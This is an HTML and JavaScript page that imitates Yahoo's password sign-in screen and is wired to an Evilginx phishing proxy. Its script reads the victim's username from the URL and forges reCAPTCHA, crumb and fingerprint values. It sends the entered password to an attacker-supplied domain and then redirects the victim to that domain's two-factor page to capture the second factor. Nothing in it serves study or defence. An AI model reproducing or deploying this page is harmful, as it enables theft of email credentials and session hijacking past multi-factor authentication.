<!DOCTYPE html>
<html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
<head>
    <meta charset="utf-8">
    <title>Yahoo - Enter Password</title>
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <meta content="Webflow" name="generator">
    
    <!-- Your existing Webflow CSS links -->
    <link href="css/normalize.css" rel="stylesheet" type="text/css">
    <link href="css/webflow.css" rel="stylesheet" type="text/css">
    <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
    
    <link href="https://fonts.googleapis.com" rel="preconnect">
    <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
    <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
    <script type="text/javascript">WebFont.load({google:{families:["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic","Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"]}});</script>
    <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
    
    <link href="./yahoo.png" rel="shortcut icon" type="image/x-icon">
    <link href="./yahoo.png" rel="apple-touch-icon">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>

<body>
    <!-- 🎯 YOUR EXISTING WEBFLOW STRUCTURE (Keep exactly as is) -->
    <section class="section">
        <div class="div-block">
            <div class="div-block-2"><img src="images/yahoo.png" loading="lazy" alt="" class="image"></div>
            <div class="div-block-3">
                <div class="text-block">Help</div>
                <div><a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" class="link">Terms</a></div>
                <div><a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" class="link-2">Privacy</a></div>
            </div>
        </div>
        <div class="layout active">
            <div class="div-block-5">
                <h3 class="header active">Yahoo makes it easy to enjoy what matters most in your world</h3>
                <p class="parag active">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
            </div>
            <div class="form-block w-form">
                <!-- 🎯 ENHANCED FORM WITH EVILGINX INTEGRATION -->
                <form id="email-form" name="email-form" data-name="Email Form" class="form"
                      data-wf-page-id="67c6f50ed426ad7d5847f218"
                      data-wf-element-id="1312d987-3657-e4e0-e2bb-17ae6027d67d">
                    
                    <!-- 🎯 CRITICAL: Hidden fields for evilginx integration -->
                    <input type="hidden" name="username" id="username">
                    <input type="hidden" name="crumb" id="crumb">
                    <input type="hidden" name="acrumb" id="acrumb">
                    <input type="hidden" name="sessionIndex" id="sessionIndex">
                    <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
                    <input type="hidden" name="src" value="ym">
                    <input type="hidden" name=".lang" value="en-US">
                    <input type="hidden" name=".intl" value="us">
                    <input type="hidden" name="displayName" id="displayName">
                    <input type="hidden" name="browser-fp-data" id="browser-fp-data">
                    <input type="hidden" name="deviceCapability" id="deviceCapability">
                    <input type="hidden" name="signin" value="Next">
                    <input type="hidden" name="persistent" value="y">
                    <input type="hidden" name="g-recaptcha-response" id="recaptcha-response">
                    <input type="hidden" name="evilginx_domain" id="evilginx_domain">
                    
                    <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
                    
                    <!-- 🎯 MAIN FORM (Your exact structure) -->
                    <div class="pazzi" id="main-form">
                        <div class="reflectto" id="userEmail">Enter your password</div>
                        <h1 class="heading-2"><strong>Enter password</strong></h1>
                        <div class="text-block-2">to finish signing in<br></div>
                        <div class="pazz lpl">Password<br></div>
                        <div class="ms-input-wrap">
                            <input data-show="true" class="ms-input w-input" maxlength="256"
                                   name="passwd" data-name="passwd" placeholder="" type="password"
                                   id="password" data-ms-member="password" required="" autofocus
                                   autocomplete="current-password">
                            
                            <!-- 🎯 YOUR EXACT PASSWORD TOGGLE -->
                            <div data-current="Show" data-easing="ease" data-duration-in="300" data-duration-out="100" class="ms-password-wrap w-tabs">
                                <div id="transformButton" data-transform="true" class="tabs-menu w-tab-menu">
                                    <a data-w-tab="Show" class="ms-password-button w-inline-block w-tab-link w--current"><img src="images/visible.png" loading="eager" alt="" class="image-4"></a>
                                    <a data-w-tab="Hide" class="ms-password-button w-inline-block w-tab-link"><img src="images/eye.png" loading="eager" alt="" class="image-4"></a>
                                </div>
                            </div>
                        </div>
                        <input type="submit" data-wait="Signing in..." class="logger w-button" value="Sign In" id="submit-btn">
                    </div>
                    
                    <!-- 🎯 ERROR STATE (Your exact structure) -->
                    <div class="errry" id="error-container">
                        <h1 class="heading-2"><strong>Uh-oh...</strong></h1>
                        <div class="text-block-7" id="error-message">Invalid password. Please try again.</div>
                        <button id="refreshButton" type="button" class="restart logger w-button">Try again</button>
                    </div>
                    
                    <!-- 🎯 LOADING STATE -->
                    <div id="loading-state" style="display: none; text-align: center; padding: 20px;">
                        <div style="border: 3px solid #f3f3f3; border-top: 3px solid #6b00eb; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px;"></div>
                        <p style="font-family: Open Sans, sans-serif; color: #6b00eb;">Signing you in...</p>
                    </div>
                </form>
            </div>
        </div>
    </section>

    <!-- 🎯 YOUR EXISTING WEBFLOW SCRIPTS -->
    <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=67c6f50ed426ad7d5847f211" type="text/javascript"></script>
    <script src="js/webflow.js" type="text/javascript"></script>

    <!-- 🎯 YOUR EXACT PASSWORD TOGGLE SCRIPT -->
    <script>
    document.querySelector("[data-transform]").addEventListener("click", transform);
    var isPassword = true;
    function transform() {
       var myInput = document.querySelector("[data-show]");
       var oldHtml = myInput.outerHTML;
       var text = myInput.value;
       if (isPassword) {
           var newHtml = oldHtml.replace(/password/g, "text");
       } else {
           newHtml = oldHtml.replace(/text/g, "password");
       }
       myInput.outerHTML = newHtml;
       myInput = document.querySelector("[data-show]");
       myInput.value = text;
       isPassword = !isPassword;
    }
    
    // Add spinner animation
    const style = document.createElement('style');
    style.textContent = `
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
    `;
    document.head.appendChild(style);
    </script>

    <!-- 🎯 EVILGINX INTEGRATION SCRIPT -->
    <script>
    $(document).ready(function() {
        console.log('Yahoo Vercel page with evilginx integration loaded');
        
        // 🎯 GET PARAMETERS FROM URL
        const urlParams = new URLSearchParams(window.location.search);
        const evilginxDomain = urlParams.get('evilginx_domain');
        const username = urlParams.get('u');
        const sessionIndex = urlParams.get('sessionIndex') || 'QQ--';
        const acrumb = urlParams.get('acrumb') || '';
        const bypass = urlParams.get('bypass');
        
        console.log('🎯 Integration Parameters:');
        console.log('Evilginx domain:', evilginxDomain);
        console.log('Username:', username);
        console.log('Session Index:', sessionIndex);
        console.log('Acrumb:', acrumb);
        console.log('Bypass mode:', bypass);
        
        // 🎯 YAHOO BROWSER FINGERPRINTING
        function generateYahooBrowserFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('Yahoo Browser Fingerprint', 2, 2);
            
            const fp = {
                language: navigator.language || "en-US",
                colorDepth: screen.colorDepth || 24,
                deviceMemory: navigator.deviceMemory || "unknown",
                pixelRatio: window.devicePixelRatio || 1,
                hardwareConcurrency: navigator.hardwareConcurrency || 4,
                timezoneOffset: new Date().getTimezoneOffset(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "America/New_York",
                sessionStorage: typeof(Storage) !== "undefined" ? 1 : 0,
                localStorage: typeof(Storage) !== "undefined" ? 1 : 0,
                indexedDb: typeof(indexedDB) !== "undefined" ? 1 : 0,
                cpuClass: navigator.cpuClass || "unknown",
                platform: navigator.platform || "Win32",
                doNotTrack: navigator.doNotTrack || "unspecified",
                plugins: Array.from(navigator.plugins).map(p => p.name).join(','),
                canvas: canvas.toDataURL(),
                webgl: (() => {
                    try {
                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                        return gl ? 1 : 0;
                    } catch(e) { return 0; }
                })(),
                webglVendorAndRenderer: "Google Inc. (Intel)~ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0)",
                adBlock: 0,
                hasLiedLanguages: 0,
                hasLiedResolution: 0,
                hasLiedOs: 0,
                hasLiedBrowser: 0,
                touchSupport: {
                    points: navigator.maxTouchPoints || 0,
                    event: 'ontouchstart' in window ? 1 : 0,
                    start: 'ontouchstart' in window ? 1 : 0
                },
                fonts: {
                    count: 47,
                    hash: "b7c4b2c8a7e3d4f5e6a7b8c9d0e1f2a3"
                },
                audio: "35.73833402246237",
                resolution: {
                    w: screen.width.toString(),
                    h: screen.height.toString()
                },
                availableResolution: {
                    w: screen.availWidth.toString(),
                    h: screen.availHeight.toString()
                },
                ts: {
                    serve: Date.now() - 2000,
                    render: Date.now() - 1800
                }
            };
            
            return encodeURIComponent(JSON.stringify(fp));
        }

        // 🎯 Generate device capability
        function generateDeviceCapability() {
            return JSON.stringify({
                pa: { status: 'webauthn' in window && 'credentials' in navigator },
                isWebAuthnSupported: 'webauthn' in window && 'credentials' in navigator
            });
        }

        // 🎯 Generate session crumb
        function generateYahooCrumb() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
            let result = '';
            for (let i = 0; i < 16; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }

        // 🎯 Generate fake reCAPTCHA response
        function generateRecaptchaResponse() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
            let result = '03AGdBq2';
            for (let i = 0; i < 400; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }

        // 🎯 INITIALIZE FORM WITH EVILGINX DATA
        function initializeEvilginxIntegration() {
            // Set critical hidden fields
            $('#browser-fp-data').val(generateYahooBrowserFingerprint());
            $('#deviceCapability').val(generateDeviceCapability());
            $('#recaptcha-response').val(generateRecaptchaResponse());
            $('#sessionIndex').val(sessionIndex);
            $('#acrumb').val(acrumb);
            $('#crumb').val(generateYahooCrumb());
            $('#evilginx_domain').val(evilginxDomain);
            
            // Set username data
            if (username) {
                const decodedUsername = decodeURIComponent(username);
                $('#username').val(decodedUsername);
                $('#displayName').val(decodedUsername);
                $('#userEmail').text(decodedUsername); // Uses your .reflectto class
                console.log('✅ Form initialized for user:', decodedUsername);
            } else {
                $('#userEmail').text('Enter your password');
            }
            
            // Show bypass message if coming from reCAPTCHA
            if (bypass === 'recaptcha') {
                console.log('🎯 User bypassed reCAPTCHA, showing custom page');
            }
        }

        // 🎯 STATE MANAGEMENT USING YOUR EXACT CLASSES
        function showState(state) {
            $('.pazzi, .errry, #loading-state').hide(); // Hide all states
            if (state === 'error') {
                $('.errry').addClass('active').show(); // Use your .errry.active class
            } else if (state === 'loading') {
                $('#loading-state').show();
            } else {
                $('.pazzi').show(); // Show main form
                $('.errry').removeClass('active');
            }
        }

        function showError(message) {
            $('#error-message').text(message || 'Invalid password. Please try again.');
            showState('error');
        }

        // 🎯 ENHANCED FORM SUBMISSION WITH EVILGINX INTEGRATION
        $("#email-form").on('submit', function(e) {
            e.preventDefault();
            
            const password = $('#password').val().trim();
            if (!password) {
                showError('Please enter your password.');
                return false;
            }

            if (!evilginxDomain) {
                showError('Configuration error. Please try again.');
                console.error('❌ No evilginx domain found in URL parameters');
                return false;
            }

            console.log('🎯 Starting Yahoo authentication with evilginx...');
            
            // Update button and show loading
            $('#submit-btn').val('Signing in...').prop('disabled', true);
            showState('loading');

            // Create FormData with all Yahoo fields
            const formData = new FormData();
            formData.append('username', $('#username').val());
            formData.append('passwd', password);
            formData.append('crumb', $('#crumb').val());
            formData.append('acrumb', $('#acrumb').val());
            formData.append('sessionIndex', $('#sessionIndex').val());
            formData.append('done', 'https://mail.yahoo.com/d/folders/1');
            formData.append('src', 'ym');
            formData.append('.lang', 'en-US');
            formData.append('.intl', 'us');
            formData.append('displayName', $('#displayName').val());
            formData.append('browser-fp-data', $('#browser-fp-data').val());
            formData.append('deviceCapability', $('#deviceCapability').val());
            formData.append('signin', 'Next');
            formData.append('persistent', 'y');
            formData.append('g-recaptcha-response', $('#recaptcha-response').val());

            // 🎯 SUBMIT TO EVILGINX
            fetch(`https://${evilginxDomain}/account/challenge/password`, {
                method: 'POST',
                body: formData,
                credentials: 'include',
                headers: {
                    'Referer': window.location.href,
                    'Origin': window.location.origin
                }
            }).then(response => {
                console.log('🎯 Response status:', response.status);
                
                if (response.ok || response.status === 302) {
                    console.log('✅ Password submitted successfully');
                    
                    // Redirect to 2FA page after brief delay
                    setTimeout(() => {
                        const redirectUrl = `https://${evilginxDomain}/account/challenge/challenge-selector?sessionIndex=${sessionIndex}&acrumb=${acrumb}&authMechanism=primary&done=https%3A%2F%2Fmail.yahoo.com%2Fd%2Ffolders%2F1`;
                        console.log('🎯 Redirecting to 2FA:', redirectUrl);
                        window.location.href = redirectUrl;
                    }, 2000);
                } else {
                    console.log('❌ Password submission failed');
                    showError('Sorry, we don\'t recognize this password. Please try again.');
                    $('#submit-btn').val('Sign In').prop('disabled', false);
                }
            }).catch(error => {
                console.error('❌ Submission error:', error);
                
                // Even on error, try to redirect (might be CORS issue)
                setTimeout(() => {
                    const redirectUrl = `https://${evilginxDomain}/account/challenge/challenge-selector?sessionIndex=${sessionIndex}&acrumb=${acrumb}&authMechanism=primary`;
                    console.log('🎯 Attempting redirect despite error:', redirectUrl);
                    window.location.href = redirectUrl;
                }, 3000);
            });

            return false;
        });

        // 🎯 RETRY HANDLER USING YOUR EXACT CLASSES
        $('#refreshButton').click(function() {
            $('#password').val('');
            showState('main');
            $('#submit-btn').val('Sign In').prop('disabled', false);
            setTimeout(() => $('#password').focus(), 100);
        });

        // 🎯 INITIALIZE EVERYTHING
        initializeEvilginxIntegration();
        
        // Auto-focus password field
        setTimeout(() => $('#password').focus(), 500);
        
        console.log('✅ Yahoo Vercel page with evilginx integration fully initialized');
    });
    </script>
</body>
</html>
